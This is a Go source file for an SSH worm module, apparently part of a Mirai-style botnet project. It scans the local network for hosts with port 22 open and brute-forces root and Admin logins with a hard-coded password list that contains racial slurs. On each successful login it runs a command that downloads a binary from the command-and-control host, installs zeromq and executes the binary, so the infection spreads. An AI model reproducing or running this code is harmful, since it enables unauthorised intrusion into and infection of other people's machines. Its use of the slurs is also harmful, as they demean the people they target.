package worm

import (
	"fmt"
	"os"
	"sync"
	"time"
	"zeroC2/mirai/components/skills"
	"zeroC2/mirai/components/system"

	"golang.org/x/crypto/ssh"
)

var (
	C2ip = "0.0.0.0"
	// config here
	//brute force <user> : list of passwords
	passwordMap = map[string][]string{
		"root": {
			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
		},
		"Admin": {
			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
		},
	}

	infcommand = "wget -O file http://%s:8080/terylene && export DEBIAN_FRONTEND=noninteractive || true && apt-get install -y libzmq3-dev || true && yes | sudo pacman -S zeromq || true && sudo dnf -y install zeromq || true && chmod +x file && ./file &"
)

func sshattack(ip string, login map[string][]string, wg *sync.WaitGroup) {
	defer wg.Done()
	var wg2 sync.WaitGroup
	cancel := make(chan struct{})

term:
	for user, pass := range login {
		for _, i := range pass {
			select {
			case <-cancel:
				break term
			default:
				wg2.Add(1)
				go sshconnect(ip, user, i, &wg2, cancel)
				time.Sleep(1 * time.Second)
			}
		}
	}

	wg2.Wait()
	close(cancel)
}

func sshconnect(ip, user, pass string, wg *sync.WaitGroup, cancel chan struct{}) {
	defer wg.Done()
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         300 * time.Millisecond,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", ip), config)
	if err != nil {
		return
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return
	}
	defer session.Close()

	session.Stdout = os.Stdout
	session.Stderr = os.Stderr

	if err := session.Run(fmt.Sprintf(infcommand, C2ip)); err != nil {
		return
	}

	cancel <- struct{}{}
}
func sshworm(ips []string, login map[string][]string) {
	var wg sync.WaitGroup

	if len(ips) == 0 {
		return
	}

	for _, ip := range ips {
		wg.Add(1)
		go sshattack(ip, login, &wg)
	}

	wg.Wait()
}

func Startworm() {
	ip, err := system.GETIPDNS()
	OS, _ := system.GETSYSTEM()

	var valid []string
	if err != nil {
		ip := system.GetIpInterface()
		if len(ip) == 0 {
			return
		}
		active := skills.Pinger(ip, OS)
		for _, ip := range active {
			if skills.IsSSHOpen(ip) {
				valid = append(valid, ip)
			}
		}
		sshworm(valid, passwordMap)
	}
	active := skills.Pinger(ip, OS)
	for _, ip := range active {
		if skills.IsSSHOpen(ip) {
			valid = append(valid, ip)
		}
	}
	sshworm(active, passwordMap)

	onlineworm()
}
